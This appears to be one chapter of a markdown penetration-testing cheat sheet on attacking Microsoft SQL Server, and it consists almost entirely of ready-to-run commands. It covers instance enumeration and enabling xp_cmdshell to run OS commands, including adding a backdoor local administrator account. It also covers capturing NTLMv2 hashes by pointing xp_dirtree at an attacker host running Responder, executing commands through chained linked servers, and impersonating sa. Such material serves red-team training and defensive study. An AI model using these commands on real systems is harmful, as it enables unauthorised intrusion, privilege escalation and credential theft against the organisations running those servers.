# 09 — MSSQL Attacks & Linked Server Chains

[← Back to index](README.md)

## 9.1 MSSQL Enumeration

```bash
# Discover MSSQL instances
nmap -sV -p 1433 10.10.10.0/24 --script ms-sql-info,ms-sql-config,ms-sql-empty-password
nxc mssql 10.10.10.0/24 -u $USER -p $PASS

nxc mssql 10.10.10.100 -u sa -p $PASS --local-auth
nxc mssql 10.10.10.100 -u sa -p $PASS --local-auth -x whoami
```

```powershell
# PowerUpSQL — enumerate MSSQL
Import-Module PowerUpSQL.ps1
Get-SQLInstanceDomain      # Find all SQL instances via SPN
Get-SQLInstanceLocal       # Local instances
Get-SQLInstanceScanUDP     # UDP scan

# Check access
Get-SQLConnectionTestThreaded -Verbose -Instance SQL01.corp.local
Get-SQLServerInfo -Verbose -Instance SQL01.corp.local

# Test with current Windows auth
Get-SQLQuery -Instance SQL01.corp.local -Query 'SELECT @@servername'
```

## 9.2 MSSQL Command Execution

```sql
-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute system command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker Pass123! /add && net localgroup administrators hacker /add';
```

```bash
# Impacket mssqlclient
impacket-mssqlclient $DOMAIN/$USER:$PASS@$SQL_IP -windows-auth
impacket-mssqlclient $USER:$PASS@$SQL_IP
```

```bash
# Once connected:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_dirtree

# Refer to Cheat Sheet
```

```powershell
# PowerUpSQL command execution
Invoke-SQLOSCmd -Verbose -Instance SQL01.corp.local -Command 'whoami'
```

```sql
-- UNC path injection (capture NTLMv2 hash via Responder)
EXEC xp_dirtree '\\$LHOST\share';
-- Run Responder first: sudo responder -I eth0
```

## 9.3 MSSQL Linked Server Exploitation

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers WHERE is_linked = 1;
EXEC sp_linkedservers;
```

```powershell
# PowerUpSQL linked server enum
Get-SQLServerLink -Verbose -Instance SQL01.corp.local
Get-SQLServerLinkCrawl -Verbose -Instance SQL01.corp.local
```

```sql
-- Execute query on linked server
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@SERVERNAME');
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER');

-- Execute xp_cmdshell via linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- Chain through multiple linked servers
EXEC ('EXEC (''xp_cmdshell ''''whoami''''; '') AT [SERVER3]') AT [SERVER2];
```

```powershell
# PowerUpSQL auto-exploit chain
Get-SQLServerLinkCrawl -Verbose -Instance SQL01.corp.local -Query 'exec master..xp_cmdshell ''whoami'''
```

```sql
-- Check impersonation (EXECUTE AS)
SELECT distinct b.name FROM sys.server_permissions a
    INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
    WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
```

---

[← Prev: 08 — Domain Privilege Escalation](08-domain-privilege-escalation.md) | [Next: 10 — Pivoting & Tunneling →](10-pivoting-and-tunneling.md)
